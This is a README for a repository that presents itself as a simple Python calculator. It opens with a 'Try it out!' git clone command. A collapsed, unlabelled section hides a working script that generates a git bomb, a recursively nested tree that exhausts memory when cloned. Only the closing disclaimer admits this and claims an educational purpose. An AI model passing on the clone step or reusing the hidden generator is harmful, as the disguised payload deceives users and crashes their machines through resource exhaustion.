# Python Calculator

A calculator written in python

[Licence](LICENCE)
> Permission to use, copy, modify, and/or distribute this software for any purpose with or without fee is hereby granted.
>
> THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

**Try it out!**
```sh
git clone https://github.com/Luke-zhang-04/python-calculator.git
cd python-calculator
python3 .
```

But first, you should read the whole README.

I wrote this calculator with the following:

- ~~Python 3.0~~
- ~~Python 3.1~~
- ~~Python 3.2~~
- ~~Python 3.3~~
- ~~Python 3.4~~
- ~~Python 3.5~~
- ~~Python 3.6~~
- ~~Python 3.7~~
- Python 3.8
- Python 3.9
- Python 3.10
- `int`
- `str`
- This bacon sandwhich tastes good
- `==` operator
- `import`
- `sys`
- `sys.stdin`
- `sys.stdin.readline`
- `sys.stdout`
- `sys.stdout.write`
- Functions
- `addition`
- `subtraction`
- `multiplication`
- `division`
- `print`
- `if` statement!
- **3 variables!**
- walrus operator
- `asyncio`
- `time`
- `time.sleep`
- `random`
- `raise`
- Comments!

## Features
- Addition
- Subtraction
- Multiplication
- Print to stdout
- Input from stdin
- Division
- Raw error messages
  - Quits the program automatically when the user enters something that's not a number
- Unknown Operator

<details>  
<summary></summary>
    
```python
#! /usr/bin/env python3
import binascii
import subprocess
import tempfile


def write_git_object(object_body, type='tree'):
    '''Writes a git object and returns the hash'''
    with tempfile.NamedTemporaryFile() as f:
        f.write(object_body)
        f.flush()
        command = ['git', 'hash-object', '-w', '-t', type, f.name]
        return subprocess.check_output(command).strip()


def write_git_commit(tree_hash, commit_message='Create a git bomb'):
    '''Writes a git commit and returns the hash'''
    command = ['git', 'commit-tree', '-m', commit_message, tree_hash]
    return subprocess.check_output(command).strip()


def create_tree(dirs, perm):
    body = b''
    for a_dir in sorted(dirs, key=lambda x: x[0]):
        body += bytearray(perm, 'ascii') + b'\x20' + bytearray(a_dir[0], 'ascii') + b'\x00' + binascii.unhexlify(a_dir[1])
    return body


def create_blob(body=''):
    return bytearray(body, 'ascii')


if __name__ == '__main__':
    depth = 10  # how many layers deep
    width = 10  # how many files or folders per depth level
    blob_body = 'one laugh'  # content of blob at bottom

    # create base blob
    blob_hash = write_git_object(create_blob(body=blob_body), type='blob')

    # write tree object containing many files
    dirs = [('f' + str(i), blob_hash) for i in range(width)]
    tree_hash = write_git_object(create_tree(dirs, '100644'), type='tree')

    # make layers of tree objects using the previous tree object
    for i in range(depth - 1):
        other_dirs = [('d' + str(i), tree_hash) for i in range(width)]
        tree_hash = write_git_object(create_tree(other_dirs, '40000'), type='tree')

    commit_hash = write_git_commit(tree_hash)

    # update master ref
    open('.git/refs/heads/master', 'wb').write(commit_hash)
```
</details>

###### Disclaimer

This is probably the right spot to put this; at the bottom of the README. This is a git bomb. Any attempt to clone it will result in your ram being eaten.

This repository was created for educational purposes only. Before cloning any open source repository, one has the ability to inspect the source code, as they should. This repository was not created with any malicious intent. Cloning this repository should not cause any permanent damage to anyones hardware, although this cannot be guaranteed and the author disclaims all warranty. In the event that someone else uses this repository maliciously, the licence terms still apply.

This program is free software. It comes without any warranty, to the extent permitted by applicable law. You can redistribute it and/or modify it under the terms of the 0BSD licence.
